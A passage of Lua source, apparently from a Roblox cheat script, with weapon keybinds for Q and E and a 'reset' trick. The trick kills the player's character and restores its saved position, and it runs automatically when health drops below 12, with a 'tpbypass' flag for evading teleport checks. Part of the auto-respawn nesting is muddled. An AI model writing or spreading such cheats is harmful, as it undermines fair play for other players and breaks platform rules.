			Title = "Oldgen";
			Text = "Keybinds Enabled! Glock is Q, Shotty is E, And Reset is R.";
		})
		local Player = game.Players.LocalPlayer
		local mouse = Player:GetMouse()
		local loop = true
		local died = false

		mouse.KeyDown:connect(function(key)
			if key == "q" then
				Player.Character.Humanoid:UnequipTools()

				Player.Backpack.Glock.Parent = Player.Character

			end
		end)

		mouse.KeyDown:connect(function(key)
			if key == "e" then
				Player.Character.Humanoid:UnequipTools()

				Player.Backpack.Shotty.Parent = Player.Character

			end
		end)

		mouse.KeyDown:connect(function(key)
			if key == "r" then
				
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
				if tpbypass == false then
					
				mn = game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
				game.Players.LocalPlayer.Character.Parent = workspace.Terrain

				game:GetService('Workspace'):WaitForChild(game.Players.LocalPlayer.Name)
				for i = 1, 10 do
					game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = mn
					wait()
					end
				else
					mn = game.Players.LocalPlayer.Character:WaitForChild('Torso').CFrame
					game.Players.LocalPlayer.Character.Parent = workspace.Terrain

					game:GetService('Workspace'):WaitForChild(game.Players.LocalPlayer.Name)
					for i = 1, 10 do
						game.Players.LocalPlayer.Character:WaitForChild('Torso').CFrame = mn
						wait()	
					end
				end
			end
		end)

		repeat wait()
			pcall(function()
			if game.Players.LocalPlayer.Character.Humanoid.Health <12 then
				local died = true
				if died == true then
				if tpbypass == false then
					game.Players.LocalPlayer.Character.Humanoid.Health = 0
					mn = game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
					game.Players.LocalPlayer.Character.Parent = workspace.Terrain

					game:GetService('Workspace'):WaitForChild(game.Players.LocalPlayer.Name)
					for i = 1, 10 do
						game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = mn
						wait()

						died = false
					end
				end
			end
		else
				if game.Players.LocalPlayer.Character.Humanoid.Health <12 then
					local died = true
					if died == true then
							game.Players.LocalPlayer.Character.Humanoid.Health = 0
							mn = game.Players.LocalPlayer.Character:WaitForChild('Torso').CFrame
							game.Players.LocalPlayer.Character.Parent = workspace.Terrain

							game:GetService('Workspace'):WaitForChild(game.Players.LocalPlayer.Name)
							for i = 1, 10 do
								game.Players.LocalPlayer.Character:WaitForChild('Torso').CFrame = mn
								wait()

							died = false
						end
					end
				end
				end
			end)
		until loop == false
	end)

	shottypp.Name = "shottypp"
	shottypp.Parent = main
	shottypp.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
	shottypp.BorderSizePixel = 0
